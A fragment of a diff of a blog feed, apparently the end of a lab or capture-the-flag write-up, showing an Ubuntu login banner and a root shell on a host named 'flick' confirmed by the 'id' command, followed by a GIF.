-Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com/
-
-  System information as of Wed Aug 13 01:11:18 SAST 2014
-
-  System load:  0.0               Processes:              90
-  Usage of /:   39.8% of 6.99GB   Users logged in:        2
-  Memory usage: 41%               IP address for eth0:    192.168.0.106
-  Swap usage:   1%                IP address for docker0: 172.17.42.1
-
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
-
-79 packages can be updated.
-51 updates are security updates.
-
-New release '14.04.1 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
-
-Last login: Wed Aug 13 00:59:56 2014 from 192.168.0.110
-root@flick:~# id
-uid=0(root) gid=0(root) groups=0(root)
-root@flick:~#
-</code></pre>
-
-<p><img src="http://gifstumblr.com/images/haters-gonna-hate_1042.gif" alt="" /></p>
 ]]></content>
   </entry>
   
